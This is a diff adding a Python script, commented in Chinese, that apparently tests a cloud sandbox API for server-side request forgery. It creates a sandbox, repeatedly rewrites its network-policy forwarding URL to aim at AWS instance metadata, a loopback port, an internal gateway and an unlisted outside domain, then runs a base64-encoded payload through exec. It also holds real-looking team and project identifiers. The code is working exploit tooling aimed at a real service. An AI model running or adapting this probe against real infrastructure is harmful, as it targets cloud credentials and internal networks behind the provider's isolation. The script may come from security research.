@@ -1,0 +1,76 @@
+====================
+     1→# 本地驱动: 逐轮 update forwardURL 目标 -> 沙箱请求, 测 SSRF
+     2→import json, base64, pathlib, urllib.request, urllib.error, sys
+     3→
+     4→TOKEN = "<REDACTED_VERCEL_TOKEN>"  # redacted: real PAT was committed by mistake and rotated
+     5→TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
+     6→PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"
+     7→
+     8→# 重新创建沙箱(超时停止后需重建)
+     9→def fresh_sandbox(name):
+    10→    api("DELETE", f"/v2/sandboxes/{name}?teamId={TEAM}&projectId={PROJ}")
+    11→    c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
+    12→               {"projectId": PROJ, "name": name,
+    13→                "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
+    14→    print("create:", c)
+    15→    d = json.loads(r)
+    16→    sid = d["sandbox"]["currentSessionId"]
+    17→    print("sid:", sid)
+    18→    return sid
+    19→
+    20→def api(method, path, body=None):
+    21→    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
+    22→    req.add_header("Authorization", f"Bearer {TOKEN}")
+    23→    req.add_header("Content-Type", "application/json")
+    24→    data = json.dumps(body).encode() if body is not None else None
+    25→    try:
+    26→        with urllib.request.urlopen(req, data=data, timeout=60) as r:
+    27→            return r.status, r.read().decode()
+    28→    except urllib.error.HTTPError as e:
+    29→        return e.code, e.read().decode()[:600]
+    30→
+    31→SID = fresh_sandbox("expe3")
+    32→
+    33→def run_round(label, fwd_url, match_path, req_path):
+    34→    print(f"\n########## ROUND {label}: forwardURL={fwd_url} match={match_path} ##########", flush=True)
+    35→    c, r = api("POST", f"/v2/sandboxes/sessions/{SID}/network-policy?teamId={TEAM}",
+    36→               {"allow": {"httpbin.org": [{"match": {"path": {"exact": match_path}},
+    37→                                            "forwardURL": fwd_url}]}})
+    38→    if c != 200:
+    39→        print(f"update FAILED: {c} {r[:300]}")
+    40→        return False
+    41→    print("update OK")
+    42→    payload = base64.b64encode(pathlib.Path("exp_e3.py").read_bytes()).decode()
+    43→    body = {"command": "python3", "args": ["-c",
+    44→            f"import base64;exec(base64.b64decode('{payload}').decode())", label],
+    45→            "wait": True, "logs": True, "timeout": 60000}
+    46→    c, r = api("POST", f"/v2/sandboxes/sessions/{SID}/cmd?teamId={TEAM}", body)
+    47→    print(f"cmd: {c}")
+    48→    for line in r.splitlines():
+    49→        line = line.strip()
+    50→        if not line:
+    51→            continue
+    52→        try:
+    53→            d = json.loads(line)
+    54→            if d.get("stream") in ("stdout", "stderr"):
+    55→                print(d.get("data", ""), end="")
+    56→            elif d.get("stream") == "command":
+    57→                print("\nEXIT:", d.get("command", {}).get("exitCode"))
+    58→        except Exception:
+    59→            print(line[:300])
+    60→    return True
+    61→
+    62→# 轮次0: 对照 - https 公网转发恢复基线
+    63→run_round("R0-BASELINE", "https://httpbin.org/anything", "/latest", "/latest")
+    64→# 轮次1: AWS IMDS (https)
+    65→run_round("R1-IMDS", "https://169.254.169.254", "/latest", "/latest")
+    66→# 轮次2: 回环端口 (https)
+    67→run_round("R2-LOOPBACK", "https://127.0.0.1:26661", "/console", "/console")
+    68→# 轮次3: 内部网关 (https)
+    69→run_round("R3-GATEWAY", "https://100.64.0.1", "/gw", "/gw")
+    70→# 轮次4: 公网 https 对照
+    71→run_round("R4-PUBLIC", "https://example.com", "/plain", "/plain")
+    72→# 轮次5: 任意公网域(不在 allowedDomains) https
+    73→run_round("R5-FOREIGN", "https://postman-echo.com", "/echo", "/echo")
+    74→
+
